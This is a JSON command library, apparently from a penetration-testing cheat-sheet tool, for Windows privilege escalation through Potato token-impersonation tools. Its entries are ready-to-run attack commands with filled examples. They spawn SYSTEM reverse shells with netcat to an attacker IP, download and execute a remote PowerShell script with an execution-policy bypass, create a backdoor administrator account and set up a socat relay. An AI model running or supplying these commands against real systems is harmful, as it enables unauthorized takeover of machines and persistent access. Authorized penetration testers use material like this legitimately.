{
  "category": "post-exploit",
  "subcategory": "privilege-escalation",
  "description": "Windows token impersonation privilege escalation using Potato attacks (PrintSpoofer, GodPotato, JuicyPotato, RoguePotato, SweetPotato)",
  "commands": [
    {
      "id": "printspoofer-interactive",
      "name": "PrintSpoofer Interactive Shell",
      "category": "post-exploit",
      "command": "PrintSpoofer64.exe -i -c cmd",
      "description": "Spawn interactive SYSTEM shell using PrintSpoofer (Windows 10 1809+, Server 2019+)",
      "tags": [
        "PRIVESC",
        "WINDOWS",
        "TOKEN_IMPERSONATION",
        "PRINTSPOOFER",
        "SYSTEM"
      ],
      "variables": [],
      "flag_explanations": {
        "-i": "Interactive mode - spawns new console window",
        "-c cmd": "Command to execute as SYSTEM - cmd.exe for interactive shell"
      },
      "success_indicators": [
        "nt authority\\system",
        "new cmd window spawns"
      ],
      "failure_indicators": [
        "SeImpersonatePrivilege required",
        "Named Pipe error"
      ],
      "notes": "Requires SeImpersonatePrivilege. Uses Print Spooler service for token capture. Best choice for modern Windows. If fails, try GodPotato.",
      "filled_example": "PrintSpoofer64.exe -i -c cmd"
    },
    {
      "id": "printspoofer-reverse-shell",
      "name": "PrintSpoofer Reverse Shell",
      "category": "post-exploit",
      "command": "PrintSpoofer64.exe -c \"<NC_PATH> <LHOST> <LPORT> -e cmd.exe\"",
      "description": "Spawn SYSTEM reverse shell using PrintSpoofer",
      "tags": [
        "PRIVESC",
        "WINDOWS",
        "TOKEN_IMPERSONATION",
        "PRINTSPOOFER",
        "REVERSE_SHELL"
      ],
      "variables": [
        {
          "name": "<NC_PATH>",
          "description": "Path to netcat executable on target",
          "example": "C:\\Windows\\Temp\\nc.exe",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attacker IP address",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker listening port",
          "example": "4445",
          "required": true
        }
      ],
      "success_indicators": [
        "SYSTEM shell received on listener"
      ],
      "failure_indicators": [
        "connection refused",
        "access denied"
      ],
      "notes": "Upload nc.exe first. Start listener: nc -nlvp 4445. Alternative: use PowerShell reverse shell instead of nc.exe.",
      "filled_example": "PrintSpoofer64.exe -c \"C:\\Windows\\Temp\\nc.exe 10.10.14.5 4445 -e cmd.exe\""
    },
    {
      "id": "printspoofer-add-user",
      "name": "PrintSpoofer Add Admin User",
      "category": "post-exploit",
      "command": "PrintSpoofer64.exe -c \"net user <USERNAME> <PASSWORD> /add && net localgroup administrators <USERNAME> /add\"",
      "description": "Create local administrator account using PrintSpoofer SYSTEM privileges",
      "tags": [
        "PRIVESC",
        "WINDOWS",
        "TOKEN_IMPERSONATION",
        "PERSISTENCE"
      ],
      "variables": [
        {
          "name": "<USERNAME>",
          "description": "Username for new admin account",
          "example": "pwned",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "Password for new account",
          "example": "Password123!",
          "required": true
        }
      ],
      "success_indicators": [
        "command completed successfully",
        "user added"
      ],
      "failure_indicators": [
        "access denied",
        "password does not meet complexity"
      ],
      "notes": "Creates persistent admin access. Use complex password to meet policy requirements. Can then RDP or PSExec as new user.",
      "filled_example": "PrintSpoofer64.exe -c \"net user pwned Password123! /add && net localgroup administrators pwned /add\""
    },
    {
      "id": "godpotato-cmd",
      "name": "GodPotato Execute Command",
      "category": "post-exploit",
      "command": "GodPotato-NET4.exe -cmd \"cmd /c <COMMAND>\"",
      "description": "Execute command as SYSTEM using GodPotato (works without Print Spooler)",
      "tags": [
        "PRIVESC",
        "WINDOWS",
        "TOKEN_IMPERSONATION",
        "GODPOTATO"
      ],
      "variables": [
        {
          "name": "<COMMAND>",
          "description": "Command to execute as SYSTEM",
          "example": "whoami",
          "required": true
        }
      ],
      "flag_explanations": {
        "-cmd": "Command to execute in SYSTEM context"
      },
      "success_indicators": [
        "nt authority\\system",
        "command output"
      ],
      "failure_indicators": [
        ".NET Framework error",
        "RPC error"
      ],
      "notes": "Uses DCOM/RPCSS instead of Print Spooler. Works when PrintSpoofer fails. Use NET4 for modern Windows, NET2 for older. Requires SeImpersonatePrivilege.",
      "filled_example": "GodPotato-NET4.exe -cmd \"cmd /c whoami\""
    },
    {
      "id": "godpotato-reverse-shell",
      "name": "GodPotato Reverse Shell",
      "category": "post-exploit",
      "command": "GodPotato-NET4.exe -cmd \"<NC_PATH> <LHOST> <LPORT> -e cmd.exe\"",
      "description": "Spawn SYSTEM reverse shell using GodPotato",
      "tags": [
        "PRIVESC",
        "WINDOWS",
        "TOKEN_IMPERSONATION",
        "GODPOTATO",
        "REVERSE_SHELL"
      ],
      "variables": [
        {
          "name": "<NC_PATH>",
          "description": "Path to netcat on target",
          "example": "C:\\Windows\\Temp\\nc.exe",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listening port",
          "example": "4445",
          "required": true
        }
      ],
      "success_indicators": [
        "SYSTEM shell on listener"
      ],
      "failure_indicators": [
        "connection refused"
      ],
      "notes": "Alternative to PrintSpoofer when Print Spooler disabled. Start listener first.",
      "filled_example": "GodPotato-NET4.exe -cmd \"C:\\Windows\\Temp\\nc.exe 10.10.14.5 4445 -e cmd.exe\""
    },
    {
      "id": "godpotato-powershell",
      "name": "GodPotato PowerShell Execution",
      "category": "post-exploit",
      "command": "GodPotato-NET4.exe -cmd \"powershell -ep bypass -c <POWERSHELL_COMMAND>\"",
      "description": "Execute PowerShell command as SYSTEM using GodPotato",
      "tags": [
        "PRIVESC",
        "WINDOWS",
        "TOKEN_IMPERSONATION",
        "GODPOTATO",
        "POWERSHELL"
      ],
      "variables": [
        {
          "name": "<POWERSHELL_COMMAND>",
          "description": "PowerShell command or encoded payload",
          "example": "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')",
          "required": true
        }
      ],
      "success_indicators": [
        "PowerShell executes as SYSTEM"
      ],
      "failure_indicators": [
        "constrained language mode",
        "execution policy"
      ],
      "notes": "Use -ep bypass to override execution policy. For encoded payloads: powershell -e <BASE64>. Useful for downloading and executing scripts.",
      "filled_example": "GodPotato-NET4.exe -cmd \"powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\""
    },
    {
      "id": "juicypotato-execute",
      "name": "JuicyPotato Execute",
      "category": "post-exploit",
      "command": "JuicyPotato.exe -l <LOCAL_PORT> -p <BATCH_FILE> -t * -c {<CLSID>}",
      "description": "Execute command as SYSTEM using JuicyPotato (Windows 2016 and earlier)",
      "tags": [
        "PRIVESC",
        "WINDOWS",
        "TOKEN_IMPERSONATION",
        "JUICYPOTATO"
      ],
      "variables": [
        {
          "name": "<LOCAL_PORT>",
          "description": "Local COM server port (any available)",
          "example": "1337",
          "required": true
        },
        {
          "name": "<BATCH_FILE>",
          "description": "Batch file containing command to execute",
          "example": "C:\\Windows\\Temp\\rev.bat",
          "required": true
        },
        {
          "name": "<CLSID>",
          "description": "CLSID of COM server running as SYSTEM",
          "example": "4991d34b-80a1-4291-83b6-3328366b9097",
          "required": true
        }
      ],
      "flag_explanations": {
        "-l": "Local COM server listening port",
        "-p": "Program/batch file to execute as SYSTEM",
        "-t *": "Try both CreateProcessWithToken and CreateProcessAsUser",
        "-c": "CLSID to abuse - must be valid for target Windows version"
      },
      "success_indicators": [
        "Testing CLSID... OK",
        "SYSTEM shell"
      ],
      "failure_indicators": [
        "CreateProcessWithTokenW error",
        "CLSID not found"
      ],
      "notes": "Does NOT work on Windows 10 1809+ or Server 2019+. Find CLSIDs: https://github.com/ohpe/juicy-potato/tree/master/CLSID. Common: {4991d34b-80a1-4291-83b6-3328366b9097}",
      "filled_example": "JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\rev.bat -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}"
    },
    {
      "id": "juicypotato-clsid-wmi",
      "name": "JuicyPotato with WMI CLSID",
      "category": "post-exploit",
      "command": "JuicyPotato.exe -l 1337 -p <BATCH_FILE> -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}",
      "description": "JuicyPotato using WMI CLSID (reliable on Server 2016)",
      "tags": [
        "PRIVESC",
        "WINDOWS",
        "TOKEN_IMPERSONATION",
        "JUICYPOTATO"
      ],
      "variables": [
        {
          "name": "<BATCH_FILE>",
          "description": "Batch file to execute",
          "example": "C:\\Windows\\Temp\\rev.bat",
          "required": true
        }
      ],
      "success_indicators": [
        "SYSTEM shell received"
      ],
      "failure_indicators": [
        "CLSID error"
      ],
      "notes": "WMI CLSID {8BC3F05E-D86B-11D0-A075-00C04FB68820} works on many Server 2016 installations. Try if default CLSID fails.",
      "filled_example": "JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\rev.bat -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}"
    },
    {
      "id": "juicypotato-clsid-test",
      "name": "JuicyPotato CLSID Test",
      "category": "post-exploit",
      "command": "JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\rev.bat -t * -c {<CLSID>}",
      "description": "Test different CLSIDs for JuicyPotato until one works",
      "tags": [
        "PRIVESC",
        "WINDOWS",
        "TOKEN_IMPERSONATION",
        "JUICYPOTATO"
      ],
      "variables": [
        {
          "name": "<CLSID>",
          "description": "CLSID to test",
          "example": "9B1F122C-2982-4e91-AA8B-E071D54F2A4D",
          "required": true
        }
      ],
      "notes": "Common CLSIDs to try: Server 2016: {8BC3F05E-D86B-11D0-A075-00C04FB68820}, {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}. Server 2012 R2: {03ca98d6-ff5d-49b8-abc6-03dd84127020}",
      "filled_example": "JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\rev.bat -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
    },
    {
      "id": "juicypotato-create-bat",
      "name": "Create JuicyPotato Batch File",
      "category": "post-exploit",
      "command": "echo <NC_PATH> <LHOST> <LPORT> -e cmd.exe > C:\\Windows\\Temp\\rev.bat",
      "description": "Create batch file for JuicyPotato reverse shell execution",
      "tags": [
        "PRIVESC",
        "WINDOWS",
        "JUICYPOTATO"
      ],
      "variables": [
        {
          "name": "<NC_PATH>",
          "description": "Path to nc.exe",
          "example": "C:\\Windows\\Temp\\nc.exe",
          "required": true
        },
        {
          "name": "<LHOST>",
          "description": "Attacker IP",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Listening port",
          "example": "4445",
          "required": true
        }
      ],
      "notes": "JuicyPotato -p requires file path. Create batch file with reverse shell command. Then execute with JuicyPotato.",
      "filled_example": "echo C:\\Windows\\Temp\\nc.exe 10.10.14.5 4445 -e cmd.exe > C:\\Windows\\Temp\\rev.bat"
    },
    {
      "id": "roguepotato-execute",
      "name": "RoguePotato Execute",
      "category": "post-exploit",
      "command": "RoguePotato.exe -r <ATTACKER_IP> -l <LOCAL_PORT> -e \"<COMMAND>\"",
      "description": "Execute command as SYSTEM using RoguePotato with network OXID relay",
      "tags": [
        "PRIVESC",
        "WINDOWS",
        "TOKEN_IMPERSONATION",
        "ROGUEPOTATO"
      ],
      "variables": [
        {
          "name": "<ATTACKER_IP>",
          "description": "Attacker IP running OXID relay",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LOCAL_PORT>",
          "description": "Local RPC listener port",
          "example": "9999",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "Command to execute as SYSTEM",
          "example": "C:\\Windows\\Temp\\nc.exe 10.10.14.5 4445 -e cmd.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "-r": "Remote IP for OXID resolution (attacker machine)",
        "-l": "Local port for RPC listener",
        "-e": "Command to execute with SYSTEM privileges"
      },
      "notes": "Requires attacker to run socat relay: sudo socat tcp-listen:135,reuseaddr,fork tcp:TARGET:9999. Bypasses localhost DCOM restrictions.",
      "filled_example": "RoguePotato.exe -r 10.10.14.5 -l 9999 -e \"C:\\Windows\\Temp\\nc.exe 10.10.14.5 4445 -e cmd.exe\""
    },
    {
      "id": "roguepotato-simple",
      "name": "RoguePotato Simple Mode",
      "category": "post-exploit",
      "command": "RoguePotato.exe -r <ATTACKER_IP> -e \"<COMMAND>\"",
      "description": "RoguePotato without local port specification (uses built-in OXID resolver)",
      "tags": [
        "PRIVESC",
        "WINDOWS",
        "TOKEN_IMPERSONATION",
        "ROGUEPOTATO"
      ],
      "variables": [
        {
          "name": "<ATTACKER_IP>",
          "description": "Attacker public IP with port 135 accessible",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<COMMAND>",
          "description": "Command to execute",
          "example": "whoami",
          "required": true
        }
      ],
      "notes": "Simplified mode if attacker has port 135 accessible. RoguePotato includes built-in OXID resolver.",
      "filled_example": "RoguePotato.exe -r 10.10.14.5 -e \"whoami\""
    },
    {
      "id": "sweetpotato-auto",
      "name": "SweetPotato Auto-Select",
      "category": "post-exploit",
      "command": "SweetPotato.exe -a \"<COMMAND>\"",
      "description": "Execute command as SYSTEM using SweetPotato with automatic technique selection",
      "tags": [
        "PRIVESC",
        "WINDOWS",
        "TOKEN_IMPERSONATION",
        "SWEETPOTATO"
      ],
      "variables": [
        {
          "name": "<COMMAND>",
          "description": "Command or program arguments",
          "example": "C:\\Windows\\Temp\\nc.exe 10.10.14.5 4445 -e cmd.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "-a": "Arguments to pass to spawned process"
      },
      "notes": "SweetPotato combines PrintSpoofer, EfsPotato, and JuicyPotato. Auto-selects best technique for target OS. Good first choice when unsure which potato to use.",
      "filled_example": "SweetPotato.exe -a \"C:\\Windows\\Temp\\nc.exe 10.10.14.5 4445 -e cmd.exe\""
    },
    {
      "id": "sweetpotato-efs",
      "name": "SweetPotato EFS Mode",
      "category": "post-exploit",
      "command": "SweetPotato.exe -e EfsPotato -p <PROGRAM> -a \"<ARGUMENTS>\"",
      "description": "Force SweetPotato to use EfsPotato technique (EFS RPC abuse)",
      "tags": [
        "PRIVESC",
        "WINDOWS",
        "TOKEN_IMPERSONATION",
        "SWEETPOTATO",
        "EFSPOTATO"
      ],
      "variables": [
        {
          "name": "<PROGRAM>",
          "description": "Program to execute",
          "example": "C:\\Windows\\System32\\cmd.exe",
          "required": true
        },
        {
          "name": "<ARGUMENTS>",
          "description": "Program arguments",
          "example": "/c C:\\Windows\\Temp\\nc.exe 10.10.14.5 4445 -e cmd.exe",
          "required": true
        }
      ],
      "flag_explanations": {
        "-e EfsPotato": "Force EfsPotato technique using EFS RPC",
        "-p": "Program path to execute",
        "-a": "Arguments for the program"
      },
      "notes": "EfsPotato works when Spooler disabled. Uses Encrypting File System RPC. Backup technique when standard methods fail.",
      "filled_example": "SweetPotato.exe -e EfsPotato -p C:\\Windows\\System32\\cmd.exe -a \"/c C:\\Windows\\Temp\\nc.exe 10.10.14.5 4445 -e cmd.exe\""
    },
    {
      "id": "sweetpotato-interactive",
      "name": "SweetPotato Interactive Shell",
      "category": "post-exploit",
      "command": "SweetPotato.exe -p C:\\Windows\\System32\\cmd.exe",
      "description": "Spawn interactive SYSTEM cmd.exe using SweetPotato",
      "tags": [
        "PRIVESC",
        "WINDOWS",
        "TOKEN_IMPERSONATION",
        "SWEETPOTATO"
      ],
      "variables": [],
      "flag_explanations": {
        "-p": "Program to execute - cmd.exe for interactive shell"
      },
      "notes": "Spawns new cmd.exe as SYSTEM. Use when you have console access. For remote shell, use -a with reverse shell command.",
      "filled_example": "SweetPotato.exe -p C:\\Windows\\System32\\cmd.exe"
    },
    {
      "id": "socat-relay-135",
      "name": "Socat OXID Relay for RoguePotato",
      "category": "post-exploit",
      "command": "sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET_IP>:<TARGET_PORT>",
      "description": "Set up socat relay on attacker machine for RoguePotato OXID resolution",
      "tags": [
        "PRIVESC",
        "NETWORK",
        "RELAY",
        "ROGUEPOTATO"
      ],
      "variables": [
        {
          "name": "<TARGET_IP>",
          "description": "Target machine IP",
          "example": "192.168.45.100",
          "required": true
        },
        {
          "name": "<TARGET_PORT>",
          "description": "RoguePotato local listener port",
          "example": "9999",
          "required": true
        }
      ],
      "notes": "Run on attacker (Kali). Relays RPC traffic from attacker:135 to target:9999. Requires root for port 135. Start before running RoguePotato.",
      "filled_example": "sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.45.100:9999"
    }
  ]
}